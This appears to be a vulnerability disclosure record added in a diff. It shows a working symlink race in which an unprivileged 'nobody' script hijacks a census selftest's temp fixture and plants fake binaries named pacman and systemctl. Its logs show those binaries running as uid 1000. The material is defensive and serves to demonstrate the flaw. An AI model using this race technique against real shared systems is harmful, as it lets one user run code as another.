@@ -1,0 +1,54 @@
+=== C1-S1 / (a) end-to-end, TRUE cross-user: attacker = nobody (uid 65534), census user = vgpnk (uid 1000) ===
+Preconditions (all created inside seat scratch):
+  TMPDIR=/fast/scratch/hyaku/tsukuroi-r48/TSentAlias/exp4/shared   mode 777 owner vgpnk  (NON-sticky shared dir, the only attacker capability)
+  census blob: tools/tsukuroi-census.sh @ ae99f021... sha256 375aa7370f84b0ee9d4630e2cd34165c1403901e3266db603ffa43f3a76e2426
+
+--- attacker program, executed as nobody (w+x on TMPDIR only) ---
+#!/bin/bash
+S=/fast/scratch/hyaku/tsukuroi-r48/TSentAlias/exp4
+mkdir -p "$S/atk/bin" "$S/atk/fx"; chmod 777 "$S/atk" "$S/atk/bin" "$S/atk/fx"
+while :; do
+  set -- "$S"/shared/tsukuroi-r3-2-selftest.*
+  [ -d "${1:-}" ] && [ ! -L "${1:-}" ] && break
+  sleep 0.002
+done
+w=$1; sleep 1.5
+mv -- "$w" "$S/shared/.stash" 2>/dev/null || exit 1
+ln -s -- "$S/atk" "$w" 2>/dev/null || exit 1
+sleep 0.8
+printf '#!/bin/sh\necho "CODE-EXEC-AS $(id -un) uid=$(id -u)" >> %s/pwned\nexit 0\n' "$S" > "$S/atk/bin/evil"
+chmod 755 "$S/atk/bin/evil"
+for c in pacman pacman-conf systemctl dmesg journalctl nvidia-smi lsmod expac; do cp -f -- "$S/atk/bin/evil" "$S/atk/bin/$c" 2>/dev/null; done
+while [ ! -e "$S/pwned" ]; do sleep 0.05; done
+
+--- census invocation (as vgpnk) ---
+TMPDIR=/fast/scratch/hyaku/tsukuroi-r48/TSentAlias/exp4/shared timeout 220 bash census.sh --selftest
+
+--- observed ---
+census rc=1 (from the run; summary line below)
+170:TSUKUROI_CENSUS_SELFTEST: FAIL (167 cases, 35 passed, 132 failed)
+marker file lines (each = one execution of nobody's 'pacman' by the census): 1420
+unique marker lines: 1 ->
+CODE-EXEC-AS vgpnk uid=1000
+TMPDIR contents after the run (the fixture was renamed and never removed by the trap):
+total 0
+drwxrwxrwx 3 vgpnk vgpnk 20 Oct 28 09:08 .
+drwxrwxrwx 4 vgpnk vgpnk 83 Oct 28 09:08 ..
+drwx------ 4 vgpnk vgpnk 27 Oct 28 09:08 .stash
+leaked fixture inside .stash:
+total 0
+drwx------ 4 vgpnk vgpnk  27 Oct 28 09:08 .
+drwxrwxrwx 3 vgpnk vgpnk  20 Oct 28 09:08 ..
+drwx------ 2 vgpnk vgpnk 148 Oct 28 09:08 bin
+drwx------ 5 vgpnk vgpnk  61 Oct 28 09:08 fx
+attacker-owned dir the census was made to write into and execute from:
+total 36
+drwxrwxrwx 2 nobody nobody 143 Oct 28 09:08 .
+drwxrwxrwx 5 nobody nobody  43 Oct 28 09:08 ..
+-rwxr-xr-x 1 nobody nobody 118 Oct 28 09:08 dmesg
+-rwxr-xr-x 1 nobody nobody 118 Oct 28 09:08 evil
+-rwxr-xr-x 1 nobody nobody 118 Oct 28 09:08 expac
+-rwxr-xr-x 1 nobody nobody 118 Oct 28 09:08 journalctl
+-rwxr-xr-x 1 nobody nobody 118 Oct 28 09:08 lsmod
+-rwxr-xr-x 1 nobody nobody 118 Oct 28 09:08 nvidia-smi
+-rwxr-xr-x 1 nobody nobody 118 Oct 28 09:08 pacman
